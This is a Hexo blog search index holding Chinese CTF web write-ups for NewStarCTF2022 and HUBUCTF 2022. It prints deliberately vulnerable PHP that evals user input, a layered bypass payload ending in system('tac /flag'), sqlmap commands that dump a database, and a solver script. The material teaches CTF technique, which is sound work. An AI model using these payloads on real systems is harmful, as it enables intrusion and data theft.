<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SWPU新生赛</title>
      <link href="/2022/09/30/NSS%E6%96%B0%E7%94%9F%E8%B5%9B/"/>
      <url>/2022/09/30/NSS%E6%96%B0%E7%94%9F%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF2022</title>
      <link href="/2022/09/30/NewStarCTF2022/"/>
      <url>/2022/09/30/NewStarCTF2022/</url>
      
        <content type="html"><![CDATA[<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a><strong>HTTP</strong></h3><p>get传入&#x2F;?name&#x3D;1，提示post传入key，</p><p>右键查看源码，发现key</p><p>post：key&#x3D;ctfisgood</p><p>提示需要admin身份，直接get修改name&#x3D;admin不成功</p><p>burpsuite抓包修改cookie中的user&#x3D;admin</p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930162708785.png"></p><h3 id="Head-Header"><a href="#Head-Header" class="headerlink" title="Head?Header!"></a><strong>Head?Header!</strong></h3><p>抓包修改head</p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930163518054.png"></p><h3 id="NotPHP"><a href="#NotPHP" class="headerlink" title="NotPHP"></a><strong>NotPHP</strong></h3><p>源码</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phperror_reporting(0);highlight_file(__FILE__);if(file_get_contents($_GET[&#39;data&#39;]) &#x3D;&#x3D; &quot;Welcome to CTF&quot;)&#123;    if(md5($_GET[&#39;key1&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;key2&#39;]) &amp;&amp; $_GET[&#39;key1&#39;] !&#x3D;&#x3D; $_GET[&#39;key2&#39;])&#123;        if(!is_numeric($_POST[&#39;num&#39;]) &amp;&amp; intval($_POST[&#39;num&#39;]) &#x3D;&#x3D; 2077)&#123;            echo &quot;Hack Me&quot;;            eval(&quot;#&quot;.$_GET[&#39;cmd&#39;]);        &#125;else&#123;            die(&quot;Number error!&quot;);        &#125;    &#125;else&#123;        die(&quot;Wrong Key!&quot;);    &#125;&#125;else&#123;    die(&quot;Pass it!&quot;);&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>四层绕过</p><p>php伪协议 + 数组绕过md5强类型 + intval()函数绕过+命令执行换行符%0a绕过#</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">?data&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,Welcome to CTF&amp;key1[]&#x3D;1&amp;key2[]&#x3D;2&amp;cmd&#x3D;%0asystem(&#39;tac &#x2F;flag&#39;);post:num&#x3D;2077a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930164649820.png"></p><h3 id="我真的会谢"><a href="#我真的会谢" class="headerlink" title="我真的会谢"></a><strong>我真的会谢</strong></h3><p>敏感文件泄露</p><p>dirsearch扫一下</p><pre class="line-numbers language-none"><code class="language-none">robots.txt  .index.php.swpwww.zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930172213551.png"></p><p>Part_two &#x3D; “0_e4sy_d0_y00”</p><p>Part Three: u_th1nk_so?}</p><p><strong>flag</strong>：flag{Th1s_Is_s000_e4sy_d0_y00u_th1nk_so?}</p><h3 id="Word-For-You"><a href="#Word-For-You" class="headerlink" title="Word-For-You"></a><strong>Word-For-You</strong></h3><p>sqlmap扫</p><p>爆数据库名</p><blockquote><p>python sqlmap.py -u <a href="http://6a47bd6f-3e4d-4343-a41a-d93d4342af41.node4.buuoj.cn:81/comments.php">http://6a47bd6f-3e4d-4343-a41a-d93d4342af41.node4.buuoj.cn:81/comments.php</a> –data&#x3D;”name&#x3D;NewCTFer” –dbs</p></blockquote><p>爆表名</p><blockquote><p>python sqlmap.py -u <a href="http://6a47bd6f-3e4d-4343-a41a-d93d4342af41.node4.buuoj.cn:81/comments.php">http://6a47bd6f-3e4d-4343-a41a-d93d4342af41.node4.buuoj.cn:81/comments.php</a> –data&#x3D;”name&#x3D;NewCTFer” -D wfy –tables</p></blockquote><p>爆列名</p><blockquote><p>python sqlmap.py -u <a href="http://6a47bd6f-3e4d-4343-a41a-d93d4342af41.node4.buuoj.cn:81/comments.php">http://6a47bd6f-3e4d-4343-a41a-d93d4342af41.node4.buuoj.cn:81/comments.php</a> –data&#x3D;”name&#x3D;NewCTFer” -D wfy -T wfy_comments –columns</p></blockquote><p>查询数据，得到flag</p><blockquote><p>python sqlmap.py -u <a href="http://6a47bd6f-3e4d-4343-a41a-d93d4342af41.node4.buuoj.cn:81/comments.php">http://6a47bd6f-3e4d-4343-a41a-d93d4342af41.node4.buuoj.cn:81/comments.php</a> –data&#x3D;”name&#x3D;NewCTFer” -D wfy -T wfy_comments  -C “user,display,id,name,text” –dump-all</p></blockquote><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930175338469.png" style="zoom: 50%;" />]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HUBUCTF 2022</title>
      <link href="/2022/09/30/wp/"/>
      <url>/2022/09/30/wp/</url>
      
        <content type="html"><![CDATA[<h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a><strong>checkin</strong></h3><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$username</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"this_is_secret"</span><span class="token punctuation">;</span> <span class="token variable">$password</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"this_is_not_known_to_you"</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//here I changed those two </span><span class="token variable">$info</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'info'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'info'</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">;</span><span class="token variable">$data_unserialize</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data_unserialize</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$username</span><span class="token operator">&amp;&amp;</span><span class="token variable">$data_unserialize</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"username or password error!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php弱比较&#x3D;&#x3D;绕过</p><p>构造exp<img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930111533320.png"></p><p>回显flag</p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930111749797.png"></p><h3 id="HowToGetShell"><a href="#HowToGetShell" class="headerlink" title="HowToGetShell"></a><strong>HowToGetShell</strong></h3><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mess</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z]/"</span><span class="token punctuation">,</span><span class="token variable">$mess</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"invalid input!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$mess</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>无字母数字RCE</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166029976116782246437375%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=166029976116782246437375&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-6-109143413-null-null.142%5Ev40%5Epc_rank_34_1,185%5Ev2%5Econtrol&utm_term=%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">贴篇博客</a></p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930160345370.png"></p><h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a><strong>ezsql</strong></h3><h3 id="Calculate"><a href="#Calculate" class="headerlink" title="Calculate"></a><strong>Calculate</strong></h3><p>跑脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">'http://1.14.71.254:28638/'</span>ses <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>reg <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">">(.)&lt;/div"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    get <span class="token operator">=</span> ses<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    math <span class="token operator">=</span> reg<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>get<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    final <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>math<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    result <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>final<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    post <span class="token operator">=</span> ses<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"ans"</span><span class="token punctuation">:</span> result<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'NSS'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>post<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
